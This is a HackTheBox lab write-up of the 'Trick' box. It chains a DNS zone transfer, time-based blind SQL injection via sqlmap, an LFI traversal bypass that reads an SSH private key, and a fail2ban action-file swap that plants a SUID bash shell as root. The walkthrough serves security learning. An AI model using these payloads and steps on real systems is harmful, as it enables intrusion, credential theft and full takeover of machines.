---
description: "An Easy Linux box that chains a DNS zone transfer into a time-based blind SQLi, then pivots to a second preprod subdomain where unfiltered LFI gives michael's SSH key. The privilege escalation abuses write access to fail2ban's action configs and a NOPASSWD restart to plant a SUID shell."
tags: ["fail2ban", "lfi", "sqli", "linux"]
cover: "/images/writeups/htb-trick/htb-trick-pwned.png"
title: "HTB: Trick"
date: 2026-06-08
draft: false
---


An Easy box but one that makes you work for it in an unexpected direction. Port 80 is a static placeholder page with nothing on it. The real surface is DNS: zone transfer hands you a subdomain, that subdomain has a login form with a time-based blind SQLi, you get credentials, but the LFI on that same app is filtered. The actual LFI is on a second subdomain you only find by fuzzing a prefix pattern. That subdomain reads michael's SSH key, you get in, and the privilege escalation is a clean abuse of fail2ban's action config combined with `sudo` restart rights. The credentials from payroll end up being almost irrelevant to the root path, which is a bit annoying in hindsight, but the DNS zone transfer and the fail2ban trick are both things worth keeping in your toolkit.

## Recon

```bash
…/labs/trick ❯ sudo nmap -sV -sC -T4 $DC
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-08 10:37 +0100
Nmap scan report for 10.129.227.180
Host is up (4.2s latency).
Not shown: 501 closed tcp ports (reset), 495 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Four ports. Port 80 is a "coming soon" placeholder. Port 53 is BIND, which is notable - a DNS server running on a box like this usually means there are zones to enumerate. Port 25 is SMTP but didn't respond to connection. I checked SMTP first to see if VRFY enumeration would work:

```bash
VRFY root
252 2.0.0 root
VRFY admin
550 5.1.1 <admin>: Recipient address rejected: User unknown in local recipient table
VRFY user
550 5.1.1 <user>: Recipient address rejected: User unknown in local recipient table
VRFY www-data
252 2.0.0 www-data
```

`root` and `www-data` exist. Useful context, but no direct attack path from here.

Vhost fuzzing on port 80 found nothing useful. Port 53 is the more interesting angle. DNS servers that are misconfigured to allow zone transfers will hand you the complete DNS record set for a zone - every hostname, every subdomain - in a single query. `dig axfr` sends a zone transfer request:

```bash
…/labs/trick ❯ dig axfr @$DC trick.htb

; <<>> DiG 9.20.23 <<>> axfr @10.129.227.180 trick.htb
; (1 server found)
;; global options: +cmd
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.		604800	IN	NS	trick.htb.
trick.htb.		604800	IN	A	127.0.0.1
trick.htb.		604800	IN	AAAA	::1
preprod-payroll.trick.htb. 604800 IN	CNAME	trick.htb.
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 267 msec
;; SERVER: 10.129.227.180#53(10.129.227.180) (TCP)
;; WHEN: Mon Jun 08 10:55:51 CET 2026
;; XFR size: 6 records (messages 1, bytes 231)
```

One real entry: `preprod-payroll.trick.htb`.

## Payroll SQLi

Added it to `/etc/hosts` and opened it:

![preprod-payroll.trick.htb login page with username and password fields](/images/writeups/htb-trick/web-preprod-payroll-login.png)

A login form. Time-based blind SQL injection is the type where the database pauses execution for a set number of seconds when the condition is true - the attacker infers data character by character from whether the response is delayed. It's slow but reliable when error-based injection is suppressed. I saved the login request from Burp and pointed sqlmap at it:

```bash
…/labs/trick ❯ sqlmap -r login_req 

[11:03:11] [INFO] parsing HTTP request from 'login_req'
[11:03:11] [INFO] testing connection to the target URL
[11:03:11] [INFO] checking if the target is protected by some kind of WAF/IPS
[11:03:11] [INFO] testing if the target URL content is stable
[11:03:12] [INFO] target URL content is stable
[11:03:12] [INFO] testing if POST parameter 'username' is dynamic

[11:08:20] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 1304 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=root' AND (SELECT 5929 FROM (SELECT(SLEEP(5)))BHkw) AND 'VzCS'='VzCS&password=root
---
[11:08:43] [INFO] the back-end DBMS is MySQL
```

Confirmed. Dumped databases and found `payroll_db`, then enumerated its tables:

```bash
…/labs/trick ❯ sqlmap -r login_req --dbs --batch

[11:41:25] [INFO] retrieved: payroll_db
available databases [2]:
[*] information_schema
[*] payroll_db
```

```bash
…/labs/trick ❯ sqlmap -r login_req -D payroll_db --tables --batch

[11:57:27] [INFO] adjusting time delay to 1 second due to good response times
1
[11:57:30] [INFO] retrieved: position
[11:58:06] [INFO] retrieved: employee
[11:58:40] [INFO] retrieved: department
[11:59:22] [INFO] retrieved: payroll_items
[12:00:21] [INFO] retrieved: attendance
[12:00:59] [INFO] retrieved: employee_deductions
[12:02:20] [INFO] retrieved: employee_allowances
[12:03:09] [INFO] retrieved: users
[12:03:29] [INFO] retrieved: deductions
[12:04:10] [INFO] retrieved: payrol
```

`users` table. Dumped it:

```bash
…/labs/trick ❯ sqlmap -r login_req -D payroll_db -T users -C username,password --dump --batch

[12:10:19] [INFO] adjusting time delay to 1 second due to good response times
SuperGucciRainbowCake
[12:11:43] [INFO] retrieved: Enemigosss
Database: payroll_db
Table: users
[1 entry]
+------------+-----------------------+
| username   | password              |
+------------+-----------------------+
| Enemigosss | SuperGucciRainbowCake |
+------------+-----------------------+
```

Logged in:

![Payroll admin panel after login showing employee records and management sidebar](/images/writeups/htb-trick/web-payroll-admin-panel.png)

The payroll app had a `page=` parameter that looked like it was including files. I tried LFI immediately - `page=/etc/passwd`, `page=../../../etc/passwd`, various traversal sequences. All filtered. None of them returned file content.

## LFI on preprod-marketing

The subdomain name `preprod-payroll` is a naming convention. Payroll is the noun, preprod is the prefix. If there are other apps, they'd follow the same pattern: `preprod-<appname>`. I fuzzed that prefix:

```bash
~ ❯ ffuf -u http://trick.htb -H "Host: preprod-FUZZ.trick.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,301,302 -fw 1697

marketing               [Status: 200, Size: 9660, Words: 3007, Lines: 179, Duration: 71ms]
payroll                 [Status: 302, Size: 9546, Words: 1453, Lines: 267, Duration: 92ms]
```

`preprod-marketing.trick.htb`. Also 200. This one also had a `page=` parameter, and this time the LFI wasn't filtered:

![preprod-marketing.trick.htb with page= parameter returning file contents via LFI](/images/writeups/htb-trick/web-preprod-marketing-lfi.png)

The traversal that worked used `....//` sequences instead of `../`. The double-dot double-slash pattern bypasses naive string replacement that only strips `../` once: replacing `....//` gives `../`, so one round of filtering leaves a working traversal intact.

`/etc/passwd` confirmed two shell users:

![/etc/passwd contents showing root and michael with /bin/bash login shells](/images/writeups/htb-trick/lfi-etc-passwd-output.png)

From there I read michael's SSH key. The `authorized_keys` request confirmed SSH was set up, and reading `/home/michael/.ssh/id_rsa` gave the private key:

![Burp Suite showing LFI response with michael's RSA private key material from /home/michael/.ssh/](/images/writeups/htb-trick/burp-lfi-id-rsa-response.png)

Saved the key, set permissions, SSH'd in as michael. User flag.

## Privilege Escalation: fail2ban

```bash
michael@trick:~$ whoami; id
michael
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)

michael@trick:~$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

Two things: member of `security` group, and can restart fail2ban as root without a password. Let me explain why that's exploitable.

*Reference: [juggernaut-sec.com/fail2ban-lpe](https://juggernaut-sec.com/fail2ban-lpe/)*

fail2ban monitors log files for brute-force patterns and responds by executing a configured *action* - typically an iptables rule to block the offending IP. Those actions are shell commands defined in config files under `/etc/fail2ban/action.d/`. When fail2ban is restarted it re-reads all config from disk. The `security` group controls the `action.d/` directory:

```bash
michael@trick:~$ ls -la /etc/fail2ban/
total 76
drwxr-xr-x   6 root root      4096 Jun  8 13:36 .
drwxr-xr-x 126 root root     12288 Jun  8 13:24 ..
drwxrwx---   2 root security  4096 Jun  8 13:36 action.d
-rw-r--r--   1 root root      2334 Jun  8 13:36 fail2ban.conf
drwxr-xr-x   2 root root      4096 Jun  8 13:36 fail2ban.d
drwxr-xr-x   3 root root      4096 Jun  8 13:36 filter.d
-rw-r--r--   1 root root     22908 Jun  8 13:36 jail.conf
drwxr-xr-x   2 root root      4096 Jun  8 13:36 jail.d
-rw-r--r--   1 root root       645 Jun  8 13:36 paths-arch.conf
-rw-r--r--   1 root root      2827 Jun  8 13:36 paths-common.conf
-rw-r--r--   1 root root       573 Jun  8 13:36 paths-debian.conf
-rw-r--r--   1 root root       738 Jun  8 13:36 paths-opensuse.conf
```

`action.d` is `rwxrwx---` owned by `root:security`. I can create and delete files there. The individual config files inside are owned by root with no write permissions for me, but the directory write permission means I can delete a file and replace it with one I control.

Checked `jail.conf` to understand which action file gets used and what the ban timing is:

```bash
michael@trick:~$ cat /etc/fail2ban/jail.conf | grep -A5 "sshd"
[sshd]
port    = ssh
logpath = %(sshd_log)s
backend = %(sshd_backend)s
bantime = 10s

michael@trick:~$ grep "banaction" /etc/fail2ban/jail.conf | head -5
banaction = iptables-multiport
banaction_allports = iptables-allports
```

`bantime = 10s` and `banaction = iptables-multiport`. The `iptables-multiport.conf` action file is what gets executed when fail2ban decides to ban an IP. The `actionban` directive in that file is the shell command that runs - as root, because fail2ban runs as root.

The exploit:

1. Delete `iptables-multiport.conf` from `action.d/` (allowed because we can write to the directory)
2. Copy it to `/tmp`, edit `actionban` to copy bash and set SUID
3. Copy the modified version back into `action.d/`
4. Restart fail2ban with sudo so it loads the new config
5. Trigger an SSH brute-force against the box so fail2ban fires the ban action
6. Run the SUID binary

```bash
michael@trick:~$ rm /etc/fail2ban/action.d/iptables-multiport.conf
rm: remove write-protected regular file '/etc/fail2ban/action.d/iptables-multiport.conf'? y
michael@trick:~$ cp /tmp/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf
michael@trick:~$ sudo /etc/init.d/fail2ban restart
[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
```

The modified `actionban`:

```bash
actionban = cp /bin/bash /tmp/kanyo; chmod 4755 /tmp/kanyo
```

Then triggered the ban with hydra:

```bash
~ ✗ hydra -l root -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt ssh://10.129.227.180
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-08 12:50:55
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 92 login tries (l:1/p:92), ~6 tries per task
[DATA] attacking ssh://10.129.227.180:22/
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-06-08 12:51:30
```

Back on the box:

```bash
michael@trick:/tmp$ ls
iptables-multiport.conf
kanyo

michael@trick:/tmp$ /tmp/kanyo -p
kanyo-5.0# whoami
root
kanyo-5.0# cd /root
```

Root flag.

The fail2ban abuse is one of those privescs that feels inevitable once you see the setup. Write access to action configs plus a NOPASSWD service restart is a complete chain: you control what runs as root and you control when it runs. The 10-second ban time is tight but hydra hammers fast enough that it trips the threshold. Worth keeping in mind any time you see a user in a group with names like `security`, `monitoring`, or `log` - those often have write access to config files that feed into services running as root.
